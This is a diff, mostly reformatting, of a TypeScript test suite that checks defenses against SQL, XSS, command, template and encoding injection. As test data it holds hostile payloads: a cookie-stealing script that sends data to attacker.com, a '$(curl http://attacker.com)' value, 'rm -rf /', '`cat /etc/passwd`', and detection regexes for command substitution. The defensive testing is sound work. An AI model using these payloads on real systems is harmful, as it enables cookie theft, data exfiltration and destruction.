@@ -43,10 +43,9 @@ describe('Injection Attack Prevention Tests', () => {
 					// Query should execute without throwing an error
 					// and should not return unauthorized data
 					expect(Array.isArray(result)).toBe(true);
-					
+
 					// Should not find any posts with the malicious payload as title
 					expect(result.length).toBe(0);
-
 				} catch (error) {
 					// Some payloads might cause query errors, which is acceptable
 					// as long as no data leakage occurs
@@ -96,7 +95,7 @@ describe('Injection Attack Prevention Tests', () => {
 					.select()
 					.from(posts)
 					.where(eq(posts.id, testPost.id));
-				
+
 				expect(originalPost).toHaveLength(1);
 				expect(originalPost[0].title).toBe('Test Post');
 			}
@@ -166,20 +165,14 @@ describe('Injection Attack Prevention Tests', () => {
 
 			for (const payload of blindSQLPayloads) {
 				// Query should not reveal information about database structure
-				const results = await testDb
-					.select()
-					.from(posts)
-					.where(eq(posts.title, payload));
+				const results = await testDb.select().from(posts).where(eq(posts.title, payload));
 
 				// Should return empty results
 				expect(results).toHaveLength(0);
 
 				// Response time should not vary significantly (prevent timing attacks)
 				const startTime = Date.now();
-				await testDb
-					.select()
-					.from(posts)
-					.where(eq(posts.content, payload));
+				await testDb.select().from(posts).where(eq(posts.content, payload));
 				const endTime = Date.now();
 
 				// Query should complete quickly (no time-based injection)
@@ -205,7 +198,10 @@ describe('Injection Attack Prevention Tests', () => {
 
 			for (const payload of xssPayloads) {
 				const sanitized = mockSanitizeHTML(payload.payload);
-				const testResult = SecurityTestHelpers.testInputSanitization(payload.payload, sanitized);
+				const testResult = SecurityTestHelpers.testInputSanitization(
+					payload.payload,
+					sanitized
+				);
 
 				expect(testResult.isSanitized).toBe(true);
 				expect(testResult.risks).toHaveLength(0);
@@ -223,30 +219,31 @@ describe('Injection Attack Prevention Tests', () => {
 				{
 					context: 'HTML attribute',
 					input: '" onmouseover="alert(\'XSS\')" "',
-					sanitizer: (input: string) => input.replace(/['"<>&]/g, (char) => {
-						const entities: Record<string, string> = {
-							'"': '&quot;',
-							"'": '&#x27;',
-							'<': '&lt;',
-							'>': '&gt;',
-							'&': '&amp;'
-						};
-						return entities[char] || char;
-					})
+					sanitizer: (input: string) =>
+						input.replace(/['"<>&]/g, (char) => {
+							const entities: Record<string, string> = {
+								'"': '&quot;',
+								"'": '&#x27;',
+								'<': '&lt;',
+								'>': '&gt;',
+								'&': '&amp;'
+							};
+							return entities[char] || char;
+						})
 				},
 				{
 					context: 'JavaScript string',
-					input: '\'; alert(\'XSS\'); \'',
+					input: "'; alert('XSS'); '",
 					sanitizer: (input: string) => input.replace(/[\\'"]/g, '\\$&')
 				},
 				{
 					context: 'CSS value',
-					input: 'expression(alert(\'XSS\'))',
+					input: "expression(alert('XSS'))",
 					sanitizer: (input: string) => input.replace(/expression\s*\(/gi, '')
 				},
 				{
 					context: 'URL parameter',
-					input: 'javascript:alert(\'XSS\')',
+					input: "javascript:alert('XSS')",
 					sanitizer: (input: string) => {
 						try {
 							const url = new URL(input, 'http://localhost');
@@ -260,12 +257,12 @@ describe('Injection Attack Prevention Tests', () => {
 
 			testContexts.forEach(({ context, input, sanitizer }) => {
 				const sanitized = sanitizer(input);
-				
+
 				// Should not contain dangerous patterns
 				expect(sanitized).not.toContain('alert(');
 				expect(sanitized).not.toContain('javascript:');
 				expect(sanitized).not.toContain('expression(');
-				
+
 				// Should be properly escaped/sanitized for context
 				if (context === 'HTML attribute') {
 					expect(sanitized).not.toContain('"');
@@ -283,7 +280,7 @@ describe('Injection Attack Prevention Tests', () => {
 			];
 
 			const validateCSP = (csp: string) => {
-				const directives = csp.split(';').map(d => d.trim());
+				const directives = csp.split(';').map((d) => d.trim());
 				const issues: string[] = [];
 
 				// Check for dangerous CSP configurations
@@ -291,16 +288,16 @@ describe('Injection Attack Prevention Tests', () => {
 					issues.push("'unsafe-eval' allows dangerous JavaScript execution");
 				}
 
-				if (csp.includes("script-src *") || csp.includes("default-src *")) {
-					issues.push("Wildcard (*) in script-src allows any script execution");
+				if (csp.includes('script-src *') || csp.includes('default-src *')) {
+					issues.push('Wildcard (*) in script-src allows any script execution');
 				}
 
 				if (!csp.includes('object-src') && !csp.includes("object-src 'none'")) {
-					issues.push("Missing object-src directive allows plugin execution");
+					issues.push('Missing object-src directive allows plugin execution');
 				}
 
 				if (csp.includes('data:') && csp.includes('script-src')) {
-					issues.push("data: protocol in script-src can be dangerous");
+					issues.push('data: protocol in script-src can be dangerous');
 				}
 
 				return {
@@ -309,7 +306,7 @@ describe('Injection Attack Prevention Tests', () => {
 				};
 			};
 
-			mockCSPHeaders.forEach(csp => {
+			mockCSPHeaders.forEach((csp) => {
 				const result = validateCSP(csp);
 				// All test CSP headers should be reasonably secure
 				expect(result.issues.length).toBeLessThanOrEqual(1);
@@ -348,17 +345,17 @@ describe('Injection Attack Prevention Tests', () => {
 
 			const domXSSPayloads = [
 				'<img src="x" onerror="alert(\'DOM XSS\')">',
-				'<script>document.location=\'http://attacker.com/cookie.php?c=\'+document.cookie</script>',
+				"<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>",
 				'"><svg onload="alert(\'DOM XSS\')">',
-				'javascript:alert(\'DOM XSS\')'
+				"javascript:alert('DOM XSS')"
 			];
 
-			domXSSPayloads.forEach(payload => {
+			domXSSPayloads.forEach((payload) => {
 				const result = mockSecureDOMUpdate('test-element', payload);
-				
+
 				expect(result.safe).toBe(true);
 				expect(result.method).toBe('textContent');
-				
+
 				// When using textContent, HTML is escaped automatically
 				expect(result.content).toBe(payload); // Original content preserved as text
 			});
@@ -395,7 +392,7 @@ describe('Injection Attack Prevention Tests', () => {
 				return { operation: 'file_read', filename, safe: true };
 			};
 
-			commandPayloads.forEach(payload => {
+			commandPayloads.forEach((payload) => {
 				expect(() => {
 					mockSecureFileOperation(payload.payload);
 				}).toThrow('Invalid filename');
@@ -403,7 +400,7 @@ describe('Injection Attack Prevention Tests', () => {
 
 			// Test valid filenames
 			const validFilenames = ['document.txt', 'image_01.jpg', 'report-2024.pdf'];
-			validFilenames.forEach(filename => {
+			validFilenames.forEach((filename) => {
 				const result = mockSecureFileOperation(filename);
 				expect(result.safe).toBe(true);
 				expect(result.filename).toBe(filename);
@@ -415,7 +412,7 @@ describe('Injection Attack Prevention Tests', () => {
 			const mockSecureSystemCommand = (command: string, args: string[]) => {
 				// Whitelist of allowed commands
 				const allowedCommands = ['convert', 'identify', 'ffmpeg'];
-				
+
 				if (!allowedCommands.includes(command)) {
 					throw new Error(`Command not allowed: ${command}`);
 				}
@@ -460,14 +457,19 @@ describe('Injection Attack Prevention Tests', () => {
 				'`id`'
 			];
 
-			injectionArgs.forEach(arg => {
+			injectionArgs.forEach((arg) => {
 				expect(() => {
 					mockSecureSystemCommand('convert', ['input.jpg', arg, 'output.jpg']);
 				}).toThrow('Dangerous characters');
 			});
 
 			// Test valid operation
-			const validResult = mockSecureSystemCommand('convert', ['input.jpg', '-resize', '100x100', 'output.jpg']);
+			const validResult = mockSecureSystemCommand('convert', [
+				'input.jpg',
+				'-resize',
+				'100x100',
+				'output.jpg'
+			]);
 			expect(validResult.validated).toBe(true);
 		});
 
@@ -486,12 +488,12 @@ describe('Injection Attack Prevention Tests', () => {
 					// Check for command injection in values
 					const dangerousPatterns = [
 						/[;&|`$(){}]/,
-						/\$\([^)]*\)/,  // Command substitution
-						/`[^`]*`/,      // Backtick execution
-						/\|\s*\w+/      // Pipe to command
+						/\$\([^)]*\)/, // Command substitution
+						/`[^`]*`/, // Backtick execution
+						/\|\s*\w+/ // Pipe to command
 					];
 
-					dangerousPatterns.forEach(pattern => {
+					dangerousPatterns.forEach((pattern) => {
 						if (pattern.test(value)) {
 							errors.push(`Dangerous pattern in ${key}: ${value}`);
 						}
@@ -506,10 +508,10 @@ describe('Injection Attack Prevention Tests', () => {
 
 			// Test malicious environment variables
 			const maliciousEnvVars = {
-				'PATH': '/bin:/usr/bin:$(curl http://attacker.com)',
-				'LD_PRELOAD': '/tmp/malicious.so',
-				'NODE_ENV': 'production; rm -rf /',
-				'CUSTOM_VAR': '`cat /etc/passwd`'
+				PATH: '/bin:/usr/bin:$(curl http://attacker.com)',
+				LD_PRELOAD: '/tmp/malicious.so',
+				NODE_ENV: 'production; rm -rf /',
+				CUSTOM_VAR: '`cat /etc/passwd`'
 			};
 
 			const result = mockSecureEnvironment(maliciousEnvVars);
@@ -518,9 +520,9 @@ describe('Injection Attack Prevention Tests', () => {
 
 			// Test valid environment variables
 			const validEnvVars = {
-				'NODE_ENV': 'production',
-				'PORT': '3000',
-				'LOG_LEVEL': 'info'
+				NODE_ENV: 'production',
+				PORT: '3000',
+				LOG_LEVEL: 'info'
 			};
 
 			const validResult = mockSecureEnvironment(validEnvVars);
@@ -535,16 +537,16 @@ describe('Injection Attack Prevention Tests', () => {
 			const mockSecureTemplateRender = (template: string, data: Record<string, any>) => {
 				// Check for dangerous template expressions
 				const dangerousPatterns = [
-					/\{\{\s*.*constructor.*\}\}/,  // Constructor access
-					/\{\{\s*.*process.*\}\}/,      // Process access
-					/\{\{\s*.*global.*\}\}/,       // Global access
-					/\{\{\s*.*require.*\}\}/,      // Module loading
-					/\{\{\s*.*import.*\}\}/,       // ES6 imports
-					/\{\{\s*.*eval.*\}\}/,         // Code evaluation
-					/\{\{\s*.*Function.*\}\}/      // Function constructor
+					/\{\{\s*.*constructor.*\}\}/, // Constructor access
+					/\{\{\s*.*process.*\}\}/, // Process access
+					/\{\{\s*.*global.*\}\}/, // Global access
+					/\{\{\s*.*require.*\}\}/, // Module loading
+					/\{\{\s*.*import.*\}\}/, // ES6 imports
+					/\{\{\s*.*eval.*\}\}/, // Code evaluation
+					/\{\{\s*.*Function.*\}\}/ // Function constructor
 				];
 
-				dangerousPatterns.forEach(pattern => {
+				dangerousPatterns.forEach((pattern) => {
 					if (pattern.test(template)) {
 						throw new Error('Dangerous template expression detected');
 					}
@@ -553,7 +555,7 @@ describe('Injection Attack Prevention Tests', () => {
 				// Simple whitelist-based variable substitution
 				const allowedVars = Object.keys(data);
 				const varPattern = /\{\{\s*(\w+)\s*\}\}/g;
-				
+
 				const result = template.replace(varPattern, (match, varName) => {
 					if (!allowedVars.includes(varName)) {
 						throw new Error(`Template variable not allowed: ${varName}`);
@@ -575,7 +577,7 @@ describe('Injection Attack Prevention Tests', () => {
 
 			const templateData = { name: 'Test User', age: 25 };
 
-			maliciousTemplates.forEach(template => {
+			maliciousTemplates.forEach((template) => {
 				expect(() => {
 					mockSecureTemplateRender(template, templateData);
 				}).toThrow('Dangerous template expression detected');
@@ -632,7 +634,7 @@ describe('Injection Attack Prevention Tests', () => {
 				'{{constructor.constructor("return document")()}}'
 			];
 
-			dangerousClientTemplates.forEach(template => {
+			dangerousClientTemplates.forEach((template) => {
 				const result = mockValidateClientTemplate(template);
 				expect(result.safe).toBe(false);
 				expect(result.issues.length).toBeGreaterThan(0);
@@ -653,7 +655,10 @@ describe('Injection Attack Prevention Tests', () => {
 
 				switch (type) {
 					case 'email':
-						if (typeof input !== 'string' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input)) {
+						if (
+							typeof input !== 'string' ||
+							!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input)
+						) {
 							errors.push('Invalid email format');
 						}
 						if (input.length > 254) {
@@ -705,7 +710,11 @@ describe('Injection Attack Prevention Tests', () => {
 			const testCases = [
 				{ input: 'user@example.com', type: 'email', shouldPass: true },
 				{ input: 'invalid-email', type: 'email', shouldPass: false },
-				{ input: 'user@example.com<script>alert(1)</script>', type: 'email', shouldPass: false },
+				{
+					input: 'user@example.com<script>alert(1)</script>',
+					type: 'email',
+					shouldPass: false
+				},
 				{ input: 42, type: 'number', shouldPass: true },
 				{ input: -1, type: 'number', shouldPass: false },
 				{ input: 'Safe string', type: 'string', shouldPass: true },
@@ -765,7 +774,7 @@ describe('Injection Attack Prevention Tests', () => {
 					/eval\s*\(/i
 				];
 
-				const foundDangerous = dangerousPatterns.some(pattern => pattern.test(decoded));
+				const foundDangerous = dangerousPatterns.some((pattern) => pattern.test(decoded));
 
 				return {
 					safe: !foundDangerous,
@@ -785,7 +794,7 @@ describe('Injection Attack Prevention Tests', () => {
 				'%2522%2520onmouseover%253D%2522alert%25281%2529%2522' // Multiple encoding layers
 			];
 
-			encodingBypassAttempts.forEach(attempt => {
+			encodingBypassAttempts.forEach((attempt) => {
 				const result = mockEncodingAwareValidation(attempt);
 				expect(result.dangerous).toBe(true);
 				expect(result.safe).toBe(false);
